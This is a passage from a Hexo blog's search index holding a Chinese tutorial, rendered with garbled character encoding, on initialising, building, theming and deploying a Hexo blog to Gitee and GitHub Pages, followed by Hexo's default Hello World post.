class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo -v<br>hexo-cli: 4.3.0<br>os: win32 10.0.19043<br>node: 14.17.3<br>v8: 8.4.371.23-node.67<br>uv: 1.41.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.17.1<br>modules: 83<br>nghttp2: 1.42.0<br>napi: 8<br>llhttp: 2.1.3<br>openssl: 1.1.1k<br>cldr: 39.0<br>icu: 69.1<br>tz: 2021a<br>unicode: 13.0<br><br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä½¿ç”¨-Hexo-æ­å»ºåšå®¢"><a href="#ä¸‰ã€ä½¿ç”¨-Hexo-æ­å»ºåšå®¢" class="headerlink" title="ä¸‰ã€ä½¿ç”¨ Hexo æ­å»ºåšå®¢"></a>ä¸‰ã€ä½¿ç”¨ Hexo æ­å»ºåšå®¢</h2><p>1ã€åˆå§‹åŒ–åšå®¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mkdir blog     <span class="hljs-comment">#å»ºç«‹ blog ç›®å½•</span><br>$ <span class="hljs-built_in">cd</span> blog        <span class="hljs-comment">#è¿›å…¥ blog ç›®å½•</span><br>$ <span class="hljs-built_in">pwd</span>                  <span class="hljs-comment">#æŸ¥çœ‹æ‰€åœ¨ç›®å½•</span><br>$ hexo init            <span class="hljs-comment">#åˆå§‹åŒ–åšå®¢</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo init blog      <span class="hljs-comment">#åˆ›å»ºæ–‡ä»¶ blogï¼Œå¹¶åˆå§‹åŒ–åšå®¢</span><br>$ <span class="hljs-built_in">cd</span> blog             <span class="hljs-comment">#è¿›å…¥ blog ç›®å½•</span><br></code></pre></td></tr></table></figure><p>ç›®å½•ä¸ºæ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œæ‰€ä»¥å¯ä»¥è‡ªè¡Œå†³å®šç›®å½•åç§°å’Œè·¯å¾„ ã€‚</p><p>2ã€å¯åŠ¨åšå®¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s       <span class="hljs-comment">#ç®€å†™</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br>INFO  Validating config<br>INFO  Start processing<br>INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.<br></code></pre></td></tr></table></figure><p>å¦‚æœå¯åŠ¨åšå®¢æ—¶é‡åˆ°é˜²ç«å¢™ï¼Œç‚¹å‡»å…è®¸è®¿é—®å³å¯ã€‚</p><p>å¯ä»¥é€šè¿‡ <a href="http://localhost:4000">http://localhost:4000</a> å»è®¿é—®åšå®¢ï¼Œ<strong>Ctrl + C</strong> åœæ­¢ã€‚</p><h2 id="å››ã€æ–°å»ºä¸€ç¯‡åšå®¢æ–‡ç« "><a href="#å››ã€æ–°å»ºä¸€ç¯‡åšå®¢æ–‡ç« " class="headerlink" title="å››ã€æ–°å»ºä¸€ç¯‡åšå®¢æ–‡ç« "></a>å››ã€æ–°å»ºä¸€ç¯‡åšå®¢æ–‡ç« </h2><p>1ã€æ–°å»ºä¸€ç¯‡æ–‡ç« ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span>    <span class="hljs-comment">#æ–°å»ºä¸€ç¯‡åä¸º My New Post çš„æ–‡ç« </span><br></code></pre></td></tr></table></figure><p>2ã€æ¸…é™¤ç¼“å­˜æ–‡ä»¶ (<code>db.json</code>) å’Œå·²ç”Ÿæˆçš„é™æ€æ–‡ä»¶ (<code>public</code>)ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br></code></pre></td></tr></table></figure><p><strong>åœ¨æŸäº›æƒ…å†µï¼ˆå°¤å…¶æ˜¯æ›´æ¢ä¸»é¢˜åï¼‰ï¼Œå¦‚æœå‘ç°æ‚¨å¯¹ç«™ç‚¹çš„æ›´æ”¹æ— è®ºå¦‚ä½•ä¹Ÿä¸ç”Ÿæ•ˆï¼Œæ‚¨å¯èƒ½éœ€è¦è¿è¡Œè¯¥å‘½ä»¤ã€‚</strong></p><p>3ã€ç”Ÿæˆé™æ€æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g       <span class="hljs-comment">#ç®€å†™ </span><br></code></pre></td></tr></table></figure><p>4ã€å¯åŠ¨åšå®¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br></code></pre></td></tr></table></figure><h2 id="äº”ã€å°†åšå®¢éƒ¨ç½²åˆ°è¿œç«¯"><a href="#äº”ã€å°†åšå®¢éƒ¨ç½²åˆ°è¿œç«¯" class="headerlink" title="äº”ã€å°†åšå®¢éƒ¨ç½²åˆ°è¿œç«¯"></a>äº”ã€å°†åšå®¢éƒ¨ç½²åˆ°è¿œç«¯</h2><p>è¿™é‡Œï¼Œæ¼”ç¤ºéƒ¨ç½²åˆ° Github æˆ–è€… Gitee ä¸Šï¼Œæ¯•ç«Ÿå…è´¹ï¼Œå®é™…æ“ä½œä¸­ä»»é€‰å…¶ä¸€å³å¯ ã€‚</p><p>ç”±äºæˆ‘é…ç½®äº† <strong>Gitee</strong> çš„ SSHï¼Œè€Œæ²¡æœ‰é…ç½® <strong>Github</strong> ï¼Œæ‰€ä»¥åœ¨éƒ¨ç½²åˆ° <strong>Gitee</strong> æ—¶ï¼Œé…ç½®æ–‡ä»¶ä¸­çš„ä»“åº“åœ°å€æˆ‘ç”¨çš„æ˜¯ <code>SSH</code>ï¼Œéƒ¨ç½²åˆ° <strong>Github</strong> æ—¶ï¼Œç”¨çš„ <code>HTTP</code> ã€‚</p><p>å…·ä½“éƒ¨ç½²åˆ°å“ªä¸ªå¹³å°ï¼ˆGithub æˆ– Gitee æˆ–å…¶ä»–ï¼‰ã€ç”¨å“ªç§æ–¹å¼ï¼ˆSSH æˆ– HTTPï¼‰ï¼Œè§†è‡ªå·±çš„æƒ…å†µè€Œå®šï¼Œè¿™ä¸ªå¹¶æ²¡æœ‰é™åˆ¶ ã€‚</p><h3 id="1ã€éƒ¨ç½²åˆ°-Gitee"><a href="#1ã€éƒ¨ç½²åˆ°-Gitee" class="headerlink" title="1ã€éƒ¨ç½²åˆ° Gitee"></a>1ã€éƒ¨ç½²åˆ° Gitee</h3><p>1ï¼‰åˆ›å»ºä»“åº“ï¼Œç”¨æˆ·éƒ¨ç½²ä¸ªäººåšå®¢çš„ <strong>Gitee</strong> ä»“åº“çš„å‘½åæœ€å¥½ç¬¦åˆç‰¹å®šè¦æ±‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">ä»“åº“çš„åç§°ä¸ºï¼šç”¨æˆ·å<br>ä¾‹ï¼škeys942<br></code></pre></td></tr></table></figure><p>2ï¼‰å®‰è£… <strong>Git</strong> çš„éƒ¨ç½²æ’ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cnpm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>3ï¼‰é…ç½® <strong>_config.yml</strong> æ–‡ä»¶ï¼š</p><p>æ‰¾åˆ° <strong>104è¡Œ</strong> <strong># deploy</strong> éƒ¨åˆ†ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">ä»“åº“åœ°å€ï¼ˆä¾‹ï¼šgit@gitee.com:keys942/keys942.gitï¼‰</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><p>4ï¼‰éƒ¨ç½²åˆ°è¿œç«¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy       <span class="hljs-comment">#éƒ¨ç½²ç½‘ç«™</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo d            <span class="hljs-comment">#ç®€å†™</span><br></code></pre></td></tr></table></figure><p>5ï¼‰å›åˆ° <strong>Gitee</strong> ä»“åº“ï¼Œåˆ·æ–°ï¼Œå¯ä»¥çœ‹åˆ°æœ‰æ–‡ä»¶æˆåŠŸä¸Šä¼ ã€‚ç‚¹å‡» <strong>ã€ŒæœåŠ¡ã€-&gt;ã€ŒGitee Pagesã€</strong>ï¼Œæ‰“å¼€ <code>Gitee Pages</code> æœåŠ¡ã€‚é»˜è®¤æ“ä½œä¸‹ç›´æ¥ç‚¹å‡»ã€Œ<strong>å¯åŠ¨</strong>ã€å¹¶ç¡®è®¤ï¼Œå³å¯å¼€å¯æœåŠ¡ ã€‚</p><p>6ï¼‰è®¿é—®åœ°å€ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">ç”¨æˆ·å.gitee.io<br>ä¾‹ï¼škeys942.gitee.io<br></code></pre></td></tr></table></figure><h3 id="2ã€éƒ¨ç½²åˆ°-Github"><a href="#2ã€éƒ¨ç½²åˆ°-Github" class="headerlink" title="2ã€éƒ¨ç½²åˆ° Github"></a>2ã€éƒ¨ç½²åˆ° Github</h3><p>1ï¼‰åˆ›å»ºä»“åº“ï¼Œç”¨æˆ·éƒ¨ç½²ä¸ªäººåšå®¢çš„ <strong>Github</strong> ä»“åº“çš„å‘½åå¿…é¡»ç¬¦åˆç‰¹å®šè¦æ±‚æ‰è¡Œ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ä»“åº“çš„åç§°ä¸ºï¼šç”¨æˆ·å<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span><br>ä¾‹ï¼škeys942<span class="hljs-selector-class">.github</span>.io<br></code></pre></td></tr></table></figure><p>2ï¼‰å®‰è£… <strong>Git</strong> çš„éƒ¨ç½²æ’ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cnpm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>3ï¼‰é…ç½® <strong>_config.yml</strong> æ–‡ä»¶ï¼š</p><p>æ‰¾åˆ° <strong>104 è¡Œ</strong> <strong># deploy</strong> éƒ¨åˆ†ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">ä»“åº“åœ°å€ï¼ˆä¾‹ï¼šhttps://github.com/keys942/keys942.github.io.gitï¼‰</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">main</span><br></code></pre></td></tr></table></figure><p>4ï¼‰éƒ¨ç½²åˆ°è¿œç«¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy       <span class="hljs-comment">#éƒ¨ç½²ç½‘ç«™</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo d            <span class="hljs-comment">#ç®€å†™</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºç”¨çš„æ˜¯ <strong>HTTPS</strong> ï¼Œæ‰€ä»¥ä¼šè¦æ±‚è¾“å…¥ <strong>Github</strong> ç”¨æˆ·åå’Œå¯†ç  ã€‚</p><p>5ï¼‰è®¿é—®åœ°å€ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">ç”¨æˆ·å.github.io<br>ä¾‹ï¼škeys942.github.io<br></code></pre></td></tr></table></figure><h2 id="å…­ã€æ›´æ¢ä¸»é¢˜"><a href="#å…­ã€æ›´æ¢ä¸»é¢˜" class="headerlink" title="å…­ã€æ›´æ¢ä¸»é¢˜"></a>å…­ã€æ›´æ¢ä¸»é¢˜</h2><p>ä¸åŒçš„ä¸»é¢˜åœ¨ä¸‹è½½å’Œé…ç½®ä¸Šæœ‰æ‰€ä¸åŒï¼Œè¿™é‡Œä»¥ä¸»é¢˜ <code>yilia</code> ä¸ºä¾‹ ã€‚</p><p>1ã€ä¸‹è½½ä¸»é¢˜ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia      <span class="hljs-comment">#å…‹éš†yiliaä¸»é¢˜åˆ°themes/yiliaä¸‹</span><br></code></pre></td></tr></table></figure><p>2ã€ä¿®æ”¹ <strong>_config.yml</strong> æ–‡ä»¶ï¼š</p><p>æ‰¾åˆ° <strong>100 è¡Œ theme</strong> éƒ¨åˆ†ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">theme:</span> <span class="hljs-string">landscape</span><br></code></pre></td></tr></table></figure><p>è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">theme:</span> <span class="hljs-string">yilia</span><br></code></pre></td></tr></table></figure><p>3ã€æ¸…é™¤ç¼“å­˜æ–‡ä»¶ (<code>db.json</code>) å’Œå·²ç”Ÿæˆçš„é™æ€æ–‡ä»¶ (<code>public</code>)ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br></code></pre></td></tr></table></figure><p><strong>åœ¨æŸäº›æƒ…å†µï¼ˆå°¤å…¶æ˜¯æ›´æ¢ä¸»é¢˜åï¼‰ï¼Œå¦‚æœå‘ç°æ‚¨å¯¹ç«™ç‚¹çš„æ›´æ”¹æ— è®ºå¦‚ä½•ä¹Ÿä¸ç”Ÿæ•ˆï¼Œæ‚¨å¯èƒ½éœ€è¦è¿è¡Œè¯¥å‘½ä»¤ã€‚</strong></p><p>4ã€ç”Ÿæˆé™æ€æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g<br></code></pre></td></tr></table></figure><p>5ã€å¯åŠ¨åšå®¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo s<br></code></pre></td></tr></table></figure><p>æœ¬åœ°æŸ¥çœ‹ï¼Œæ²¡é—®é¢˜åï¼Œéƒ¨ç½²åˆ°è¿œç«¯ã€‚</p><p>6ã€éƒ¨ç½²åˆ°è¿œç«¯ï¼ˆ<strong>Gitee</strong>ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo d      <span class="hljs-comment">#éƒ¨ç½²ç½‘ç«™</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ç”¨çš„æ˜¯ Gitee ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å°±éƒ¨ç½²åˆ°äº† Gitee ã€‚</p><p>7ã€è®¿é—®åœ°å€ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">ç”¨æˆ·å.gitee.io<br>ä¾‹ï¼škeys942.gitee.io<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/07/25/hello-world/"/>
    <url>/2021/07/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
